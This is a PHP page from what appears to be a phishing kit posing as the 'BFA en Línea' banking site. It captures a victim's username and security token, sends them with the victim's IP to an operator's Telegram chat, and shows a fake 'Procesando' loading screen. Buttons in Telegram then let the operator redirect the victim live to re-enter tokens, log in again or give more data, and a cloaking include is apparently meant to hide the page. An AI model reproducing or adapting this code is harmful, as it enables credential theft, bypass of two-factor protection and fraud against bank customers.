<?php
require_once __DIR__ . '/cloak.php';
session_start();
include('settings.php');

// === PRIMERA VISITA (POST desde tok.php): enviar token a Telegram ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Usuario: primero sesión, luego campo hidden del form (respaldo)
    $usuario = $_SESSION['usuario'] ?? trim($_POST['usuario'] ?? '');
    $tok     = trim($_POST['tok'] ?? '');
    error_log("carga2.php POST: usuario='$usuario' tok='$tok'");
    if (!$usuario || !$tok) { error_log('carga2.php: usuario o tok vacío, redirige'); header("Location: tok.php"); exit; }
    // Re-asegurar sesión
    $_SESSION['usuario'] = $usuario;

    $ip  = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
    $msg = "🔐 TOKEN BFA\n👤 Usuario: $usuario\n🔑 Token: $tok\n🌐 IP: $ip";

    tg_request('sendMessage', [
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '❌ Token Error', 'callback_data' => "COMPRA|$usuario"],
                    ['text' => '🔄 Login',       'callback_data' => "LOGIN|$usuario"]
                ],
                [
                    ['text' => '✅ Listo',       'callback_data' => "LISTO|$usuario"],
                    ['text' => '📋 Listado',     'callback_data' => "LISTADO|$usuario"]
                ]
            ]
        ])
    ]);
}

// === ESPERA ===
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) { header("Location: index.php"); exit; }

$archivo = "acciones/$usuario.txt";
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    @unlink($archivo);
    switch ($accion) {
        case '/LISTO':
            header("Location: listo.html"); exit;
        case '/COMPRA':
            header("Location: tokx.php"); exit;
        case '/ERROR':
            header("Location: tokx.php"); exit;
        case '/SMSERROR':
            header("Location: tokx.php"); exit;
        case '/LOGIN':
            header("Location: index.php"); exit;
        case '/LISTADO':
            header("Location: datos.php"); exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es"><head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="2">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BFA en Línea - Procesando</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:rgb(251,251,251);font-family:'Segoe UI',sans-serif}
  img{max-width:500px;width:60vw;height:auto;display:block}
</style>
</head><body>
  <img src="img/loading.gif" alt="Cargando...">
</body></html>
